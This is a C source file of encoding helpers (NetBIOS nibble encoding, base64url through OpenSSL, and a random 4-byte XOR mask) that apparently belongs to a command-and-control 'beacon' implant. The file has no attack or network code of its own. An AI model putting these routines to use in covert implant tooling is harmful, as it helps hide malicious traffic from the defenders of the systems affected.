#include "encoders.h"
#include "beacon.h"
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>
#include <string.h>
#include <stdint.h>

/* CRYPT_OK-compatible status: 0 = success */
#define ENC_OK 0
#define ENC_ERR 1

int netbios_encode(char base, const char *src, int length, char *dst, int maxlength) {
    int hi, low, x, y;
    for (y = 0, x = 0; x < length && y < maxlength; x++, y += 2) {
        hi = ((unsigned char)src[x] & 0xF0) >> 4;
        low = (unsigned char)src[x] & 0x0F;
        dst[y] = (char)(hi + base);
        dst[y + 1] = (char)(low + base);
    }
    return y;
}

int netbios_decode(char base, const char *src, int length, char *dst, int maxlength) {
    int i;
    unsigned char me;
    int hi, low;

    if ((length % 2) == 1)
        return 0;

    for (i = 0; i < length && (i / 2) < maxlength; i += 2) {
        hi = (unsigned char)src[i];
        low = (unsigned char)src[i + 1];
        me = (unsigned char)((hi - base) << 4);
        me = (unsigned char)(me + (low - base));
        dst[i / 2] = (char)me;
    }
    return length / 2;
}

int b64_encode_buf(const unsigned char *in, unsigned long len,
                   unsigned char *out, unsigned long *outlen) {
    BIO *b64, *mem;
    BUF_MEM *bptr;
    unsigned long need;

    if (!in || !out || !outlen) return ENC_ERR;

    b64 = BIO_new(BIO_f_base64());
    if (!b64) return ENC_ERR;
    mem = BIO_new(BIO_s_mem());
    if (!mem) {
        BIO_free(b64);
        return ENC_ERR;
    }
    b64 = BIO_push(b64, mem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    if (BIO_write(b64, in, (int)len) != (int)len) {
        BIO_free_all(b64);
        return ENC_ERR;
    }
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);
    need = (unsigned long)bptr->length;
    if (need > *outlen) {
        BIO_free_all(b64);
        return ENC_ERR;
    }
    memcpy(out, bptr->data, need);
    *outlen = need;
    BIO_free_all(b64);
    return ENC_OK;
}

int b64_decode_buf(const unsigned char *in, unsigned long len,
                   unsigned char *out, unsigned long *outlen) {
    BIO *b64, *mem;
    int n;

    if (!in || !out || !outlen) return ENC_ERR;

    b64 = BIO_new(BIO_f_base64());
    if (!b64) return ENC_ERR;
    mem = BIO_new_mem_buf(in, (int)len);
    if (!mem) {
        BIO_free(b64);
        return ENC_ERR;
    }
    mem = BIO_push(b64, mem);
    BIO_set_flags(mem, BIO_FLAGS_BASE64_NO_NL);
    n = BIO_read(mem, out, (int)*outlen);
    BIO_free_all(mem);
    if (n < 0) return ENC_ERR;
    *outlen = (unsigned long)n;
    return ENC_OK;
}

int base64url_encode(const unsigned char *in, unsigned long len,
                     unsigned char *out, unsigned long *outlen) {
    int status;
    unsigned long x;
    unsigned long result_length;

    status = b64_encode_buf(in, len, out, outlen);
    if (status != ENC_OK)
        return status;

    result_length = *outlen;
    for (x = 0; x < *outlen; x++) {
        if (out[x] == '=') {
            out[x] = '\0';
            result_length--;
        } else if (out[x] == '/') {
            out[x] = '_';
        } else if (out[x] == '+') {
            out[x] = '-';
        }
    }
    *outlen = result_length;
    return status;
}

int base64url_decode(unsigned char *in, unsigned long len, unsigned long max,
                     unsigned char *out, unsigned long *outlen) {
    unsigned long x;

    for (x = 0; x < len; x++) {
        if (in[x] == '_')
            in[x] = '/';
        else if (in[x] == '-')
            in[x] = '+';
    }

    while ((len % 4) != 0) {
        if (len >= max)
            return ENC_ERR;
        in[len] = '=';
        len++;
    }

    return b64_decode_buf(in, len, out, outlen);
}

/*
 * Mask encoder: 4-byte random key (wire order matches Windows DWORD memcpy = LE
 * on x86, but decoder only uses the 4 raw key bytes — any 4-byte nonce works).
 */
int xor_encode(const char *src, int length, char *dst, int maxlength) {
    uint32_t x;
    uint32_t nonce;
    char *key;

    if ((length + (int)sizeof(uint32_t)) > maxlength)
        return 0;

    nonce = bigger_rand();
    memcpy(dst, &nonce, sizeof(uint32_t));
    key = dst;
    dst += sizeof(uint32_t);

    for (x = 0; x < (uint32_t)length; x++)
        dst[x] = (char)(src[x] ^ key[x % 4]);

    return length + (int)sizeof(uint32_t);
}

int xor_decode(const char *src, int length, char *dst, int maxlength) {
    uint32_t x;
    const char *key;

    if (length < (int)sizeof(uint32_t))
        return 0;
    if ((length - (int)sizeof(uint32_t)) > maxlength)
        return 0;

    key = src;
    src += sizeof(uint32_t);
    length -= (int)sizeof(uint32_t);

    for (x = 0; x < (uint32_t)length; x++)
        dst[x] = (char)(src[x] ^ key[x % 4]);

    return length;
}
